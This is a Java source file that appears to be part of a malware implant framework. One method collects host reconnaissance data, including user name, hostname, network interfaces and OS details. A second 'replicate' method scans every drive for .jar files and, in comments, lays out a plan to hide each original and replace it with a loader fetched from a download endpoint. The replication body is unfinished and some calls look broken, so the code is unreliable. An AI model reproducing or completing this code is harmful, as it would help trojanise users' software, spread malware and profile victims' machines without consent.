package com.nocebo.nCore;

import java.io.File;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Hashtable;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;

import org.w3c.dom.Document;

public class autoLib
{
    public void metadata(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
    {
        Hashtable<String,String> metadata = new Hashtable<>();
        iAgent.utilitarian nUtil = new iAgent.utilitarian();
                
        metadata.put("arch",System.getProperty("os.arch"));
        metadata.put("os",System.getProperty("os.name"));
        metadata.put("version",System.getProperty("os.version"));
        metadata.put("user",System.getProperty("user.name"));
        metadata.put("cwd",System.getProperty("user.dir"));
        metadata.put("jre",System.getProperty("java.runtime.version"));
        metadata.put("interfaces",nUtil.getAddress().toString());
        metadata.put("hostname",nUtil.getHostname());
        metadata.put("uuid",iAgent.sessUUID);
        metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
        metadata.put("error","");

        Document metaDoc = nUtil.outputToXmlDoc("metadata",metadata);
        iAgent.output.add(metaDoc);
    }

    public void replicate(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
    {
        Hashtable<String,String> metadata = new Hashtable<>();
        iAgent.utilitarian nUtil = new iAgent.utilitarian();
                
        while (iAgent.shutdown != 1)
        {
            ArrayList fileNames = new ArrayList();
            File[] roots = File.listRoots();

            for (int f=0;f<roots.length;f++)
            {  
                Files.find(
                    Paths.get(roots[f]),
                    Integer.MAX_VALUE,
                    (p, basicFileAttributes) ->
                            p.getFileName().toString().contains(".jar"))
                .forEach(b -> fileNames.add(b));
            }
            
            for (int r=0;r<fileNames.size();r++)
            {
                try
                {
                //check if bak-jarname.jar already exists, if so skip
                //copy to bak-jarname.jar
                //hide bak-jarname.jar
                //create jarname.jar containing loader, downloaded from revamped download endpoint
                }
                catch (Exception e)
                {
                    fileNames.remove(r);
                }
            }

            metadata.put("persistedPaths",String.join(",",fileNames));
            metadata.put("uuid",iAgent.sessUUID);
            metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
            metadata.put("error","");

            Document metaDoc = nUtil.outputToXmlDoc("replication",metadata);
            iAgent.output.add(metaDoc);
        }
    }
}